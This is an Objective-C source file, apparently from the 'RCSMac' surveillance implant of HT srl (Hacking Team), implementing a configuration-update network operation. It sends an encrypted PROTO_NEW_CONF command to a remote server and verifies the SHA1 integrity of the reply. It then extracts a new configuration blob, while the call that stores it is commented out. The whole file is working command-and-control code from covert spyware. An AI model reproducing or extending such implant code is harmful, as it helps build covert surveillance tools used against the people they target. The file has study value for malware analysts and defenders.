/*
 * RCSMac - ConfigurationUpdate Network Operation
 *
 *
 * Created by revenge on 12/01/2011
 * Copyright (C) HT srl 2011. All rights reserved
 *
 */

#import "ConfNetworkOperation.h"
#import "RCSMCommon.h"
#import "NSString+SHA1.h"
#import "NSData+SHA1.h"
#import "NSMutableData+AES128.h"
#import "NSMutableData+SHA1.h"

#import "RCSMTaskManager.h"

//#define DEBUG_CONF_NOP


@implementation ConfNetworkOperation

- (id)initWithTransport: (RESTTransport *)aTransport
{
  if (self = [super init])
    {
      mTransport = aTransport;
      
#ifdef DEBUG_CONF_NOP
      infoLog(ME, @"mTransport: %@", mTransport);
#endif
      return self;
    }
  
  return nil;
}

- (BOOL)perform
{
#ifdef DEBUG_CONF_NOP
  infoLog(ME, @"");
#endif
  
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  uint32_t command = PROTO_NEW_CONF;
  NSMutableData *commandData = [[NSMutableData alloc] initWithBytes: &command
                                                             length: sizeof(uint32_t)];
  NSData *commandSha = [commandData sha1Hash];
  [commandData appendData: commandSha];
  
#ifdef DEBUG_CONF_NOP
  infoLog(ME, @"commandData: %@", commandData);
#endif
  
  [commandData encryptWithKey: gSessionKey];
  
  //
  // Send encrypted message
  //
  NSURLResponse *urlResponse    = nil;
  NSData *replyData             = nil;
  NSMutableData *replyDecrypted = nil;
  
  replyData = [mTransport sendData: commandData
                 returningResponse: urlResponse];
  
  replyDecrypted = [[NSMutableData alloc] initWithData: replyData];
  [replyDecrypted decryptWithKey: gSessionKey];
  
#ifdef DEBUG_CONF_NOP
  infoLog(ME, @"replyDecrypted: %@", replyDecrypted);
#endif

  [replyDecrypted getBytes: &command
                    length: sizeof(uint32_t)];
  
  // remove padding
  [replyDecrypted removePadding];
  
  //
  // check integrity
  //
  NSData *shaRemote;
  NSData *shaLocal;
  
  @try
    {
      shaRemote = [replyDecrypted subdataWithRange:
                   NSMakeRange([replyDecrypted length] - CC_SHA1_DIGEST_LENGTH,
                               CC_SHA1_DIGEST_LENGTH)];
  
      shaLocal = [replyDecrypted subdataWithRange:
                  NSMakeRange(0, [replyDecrypted length] - CC_SHA1_DIGEST_LENGTH)];
    }
  @catch (NSException *e)
    {
#ifdef DEBUG_CONF_NOP
      errorLog(ME, @"exception on sha makerange (%@)", [e reason]);
#endif
      
      return NO;
    }
  
  shaLocal = [shaLocal sha1Hash];
  
#ifdef DEBUG_CONF_NOP
  infoLog(ME, @"shaRemote: %@", shaRemote);
  infoLog(ME, @"shaLocal : %@", shaLocal);
#endif
  
  if ([shaRemote isEqualToData: shaLocal] == NO)
    {
#ifdef DEBUG_CONF_NOP
      errorLog(ME, @"sha mismatch");
#endif
      
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      
      return NO;
    }
  
  if (command != PROTO_OK)
    {
#ifdef DEBUG_CONF_NOP
      errorLog(ME, @"No configuration available (command %d)", command);
#endif
      
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      
      return NO;
    }
    
  uint32_t configSize = 0;
  @try
    {
      [replyDecrypted getBytes: &configSize
                         range: NSMakeRange(4, sizeof(uint32_t))];
    }
  @catch (NSException *e)
    {
#ifdef DEBUG_CONF_NOP
      errorLog(ME, @"exception on configSize makerange (%@)", [e reason]);
#endif
      
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      
      return NO;
    }
  
#ifdef DEBUG_CONF_NOP
  infoLog(ME, @"configSize: %d", configSize);
#endif
  
  if (configSize == 0)
    {
#ifdef DEBUG_CONF_NOP
      errorLog(ME, @"configuration size is zero!");
#endif
      
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      
      return NO;
    }
  
  NSMutableData *configData;
  
  @try
    {
      configData = [[NSMutableData alloc] initWithData:
                    [replyDecrypted subdataWithRange: NSMakeRange(8, configSize)]];
    }
  @catch (NSException *e)
    {
#ifdef DEBUG_CONF_NOP
      errorLog(ME, @"exception on configData makerange (%@)", [e reason]);
#endif
      
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      
      return NO;
    }
  
  /*
  //
  // Store new configuration file
  //
  RCSMTaskManager *taskManager = [RCSMTaskManager sharedInstance];
  
  if ([taskManager updateConfiguration: configData] == FALSE)
    {
#ifdef DEBUG
      errorLog(ME, @"Error while storing new configuration");
#endif
    
      [configData release];
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      
      return NO;
    }
  */
  [configData release];
  [replyDecrypted release];
  [commandData release];
  [outerPool release];
  
  return YES;
}

@end